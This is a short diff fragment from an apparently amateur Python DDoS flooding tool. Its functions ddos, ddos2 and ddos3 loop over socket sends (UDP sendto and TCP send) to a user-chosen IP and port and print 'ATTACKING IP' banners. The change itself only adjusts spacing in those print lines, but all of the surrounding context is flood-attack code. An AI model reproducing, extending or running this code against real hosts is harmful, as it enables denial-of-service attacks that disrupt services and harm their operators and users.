@@ -69,7 +69,7 @@ def ddos():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"\u001b[31m ZIELX ATTACKING IP\033[92m  {}PORT{} \u001b[31m".format(ip, port))
+			print(i +"\u001b[31m ZIELX ATTACKING IP\033[92m  {} PORT {} \u001b[31m".format(ip, port))
 		except:
 			print("\033[92m [!] Error!KO!KO!KOK1ko1xuxaw")
 
@@ -83,7 +83,7 @@ def ddos2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"\u001b[31m ZIELX ATTACKING IP\033[92m  {}PORT{} \u001b[31m".format(ip, port))
+			print(i +"\u001b[31m ZIELX ATTACKING IP\033[92m  {} PORT {} \u001b[31m".format(ip, port))
 		except:
 			s.close()
 			print("\033[92m [!] Error!KO!KO!KOK1ko1xuxaw")
@@ -98,7 +98,7 @@ def ddos3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"\u001b[31m ZIELXXX ATTACKING TO\033[92m  {}PORT{} \u001b[31m".format(ip, port))
+			print(i +"\u001b[31m ZIELXXX ATTACKING TO\033[92m  {} PORT {} \u001b[31m".format(ip, port))
 		except:
 			s.close()
 			print("\033[92m [!] MT KAH MANISZZZ?")
